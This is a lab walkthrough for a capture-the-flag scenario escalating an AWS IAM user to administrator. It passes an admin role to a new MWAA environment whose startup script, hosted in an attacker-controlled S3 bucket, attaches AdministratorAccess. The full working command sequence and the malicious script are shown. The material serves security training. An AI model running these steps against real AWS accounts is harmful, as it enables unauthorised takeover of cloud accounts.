# Guided Walkthrough: Privilege Escalation via iam:PassRole + airflow:CreateEnvironment

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole` and `airflow:CreateEnvironment` permissions can create an Amazon Managed Workflows for Apache Airflow (MWAA) environment with an administrative execution role and a malicious startup script that executes with elevated privileges.

Amazon MWAA is a managed service for Apache Airflow that simplifies running data pipelines. When creating an MWAA environment, you specify an execution role that the environment uses for all operations, including running startup scripts. A critical but often overlooked feature is that MWAA environments can be configured with a startup script that runs BEFORE Airflow initializes, executing with the full permissions of the execution role.

The attack exploits the fact that MWAA allows referencing S3 buckets in external AWS accounts for the DAGs folder and startup script. This means an attacker does not need any S3 permissions in the victim account — they can host a malicious startup script in their own AWS account on a public S3 bucket. When the MWAA environment starts up (which takes 20-30 minutes), the startup script executes with the execution role's credentials, allowing the attacker to attach AdministratorAccess to their starting user and achieve full administrative access.

## The Challenge

You are starting as `pl-prod-mwaa-001-to-admin-starting-user`, a limited-privilege IAM user. Your credentials are available from the Terraform outputs after deploying the scenario. This user cannot list IAM users, access S3, or perform any sensitive operations — but it does have `iam:PassRole` on the `pl-prod-mwaa-001-to-admin-admin-role` and `airflow:CreateEnvironment` on all resources.

Your goal is to gain effective administrative access to the AWS account. The target role is `pl-prod-mwaa-001-to-admin-admin-role`, and the path runs through a freshly created MWAA environment.

## Reconnaissance

First, let's establish your current identity and confirm you lack admin access:

```bash
# Confirm identity
aws sts get-caller-identity --query 'Arn' --output text

# Confirm you cannot perform admin actions yet
aws iam list-users --max-items 1
# Expected: AccessDenied
```

Now let's enumerate what you can do. You have PassRole and CreateEnvironment, so the key question is: which roles can you pass, and to which service?

```bash
# Check what IAM role is available for passing
aws iam get-role --role-name pl-prod-mwaa-001-to-admin-admin-role \
  --query 'Role.{Arn:Arn,TrustPolicy:AssumeRolePolicyDocument}' \
  --output json

# Verify the role has AdministratorAccess attached
aws iam list-attached-role-policies \
  --role-name pl-prod-mwaa-001-to-admin-admin-role \
  --query 'AttachedPolicies[*].PolicyArn' \
  --output text
```

You'll see the admin role has `AdministratorAccess` attached and trusts `airflow.amazonaws.com`. The Terraform deployment also pre-staged a malicious startup script in an attacker-controlled S3 bucket (`pl-mwaa-001-attacker-bucket-{account_id}-{suffix}`). The startup script contains:

```bash
#!/bin/bash
aws iam attach-user-policy \
    --user-name pl-prod-mwaa-001-to-admin-starting-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

When MWAA runs this script with the admin execution role's credentials, it attaches `AdministratorAccess` directly to your starting user.

## Exploitation

With the recon complete, you understand the path: create an MWAA environment that passes the admin role and references the malicious startup script. When the environment initializes, the script runs as the admin role and grants you administrator access.

Retrieve the infrastructure details from Terraform outputs first:

```bash
cd /path/to/pathfinding-labs  # project root
MODULE_OUTPUT=$(terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_mwaa_001_iam_passrole_airflow_createenvironment.value')

ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
VPC_ID=$(echo "$MODULE_OUTPUT" | jq -r '.vpc_id')
PRIVATE_SUBNET_IDS=$(echo "$MODULE_OUTPUT" | jq -r '.private_subnet_ids | join(",")')
SECURITY_GROUP_ID=$(echo "$MODULE_OUTPUT" | jq -r '.security_group_id')
ATTACKER_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_bucket_name')
```

Now create the MWAA environment, passing the admin role and pointing to the malicious startup script:

```bash
SUBNET_1=$(echo "$PRIVATE_SUBNET_IDS" | cut -d',' -f1)
SUBNET_2=$(echo "$PRIVATE_SUBNET_IDS" | cut -d',' -f2)
ENVIRONMENT_NAME="pl-mwaa-001-demo-$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1)"

aws mwaa create-environment \
    --region "$AWS_REGION" \
    --name "$ENVIRONMENT_NAME" \
    --execution-role-arn "$ADMIN_ROLE_ARN" \
    --source-bucket-arn "arn:aws:s3:::$ATTACKER_BUCKET_NAME" \
    --dag-s3-path "dags" \
    --startup-script-s3-path "startup.sh" \
    --network-configuration "SubnetIds=$SUBNET_1,$SUBNET_2,SecurityGroupIds=$SECURITY_GROUP_ID" \
    --environment-class "mw1.small" \
    --airflow-version "2.8.1" \
    --webserver-access-mode "PUBLIC_ONLY" \
    --max-workers 2 \
    --min-workers 1
```

The API call succeeds immediately. However, MWAA provisioning takes 20-30 minutes. You need to wait for the environment to reach `AVAILABLE` status before the startup script runs:

```bash
# Poll until AVAILABLE (check every 60 seconds)
while true; do
    STATUS=$(aws mwaa get-environment \
        --region "$AWS_REGION" \
        --name "$ENVIRONMENT_NAME" \
        --query 'Environment.Status' \
        --output text)
    echo "Status: $STATUS"
    [ "$STATUS" = "AVAILABLE" ] && break
    sleep 60
done
```

Once the environment reaches `AVAILABLE`, give it an additional 30 seconds for the startup script to complete and for IAM policy propagation to take effect.

## Verification

With the startup script executed, verify that `AdministratorAccess` is now attached to your starting user:

```bash
# Check for the attached policy
aws iam list-attached-user-policies \
    --user-name pl-prod-mwaa-001-to-admin-starting-user \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text
# Expected output: arn:aws:iam::aws:policy/AdministratorAccess

# Confirm admin access by listing IAM users
aws iam list-users --max-items 3 --output table
# This should succeed now
```

If the policy is attached and you can list IAM users, the privilege escalation is complete. You now have full administrative access to the AWS account.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/mwaa-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited a subtle but dangerous property of the MWAA service: startup scripts run before Airflow initializes, execute as the execution role, and can be sourced from any S3 bucket — including buckets in other AWS accounts. By passing a highly privileged execution role to a newly created MWAA environment and staging a malicious startup script in an attacker-controlled bucket, you executed arbitrary AWS API calls as an admin role without ever directly assuming it.

In real-world environments, this pattern appears when data engineering teams are granted broad MWAA management permissions without understanding the privilege escalation risk. The `iam:PassRole` permission is the critical enabler — if an attacker can pass a role with `iam:*` or `AdministratorAccess` to any service that runs startup scripts or user-defined code (MWAA, Glue, SageMaker, etc.), that service becomes a code execution bridge into administrative access. The 20-30 minute delay between environment creation and code execution also makes this difficult to catch in real time — by the time security teams investigate the `CreateEnvironment` CloudTrail event, the startup script may have already run.
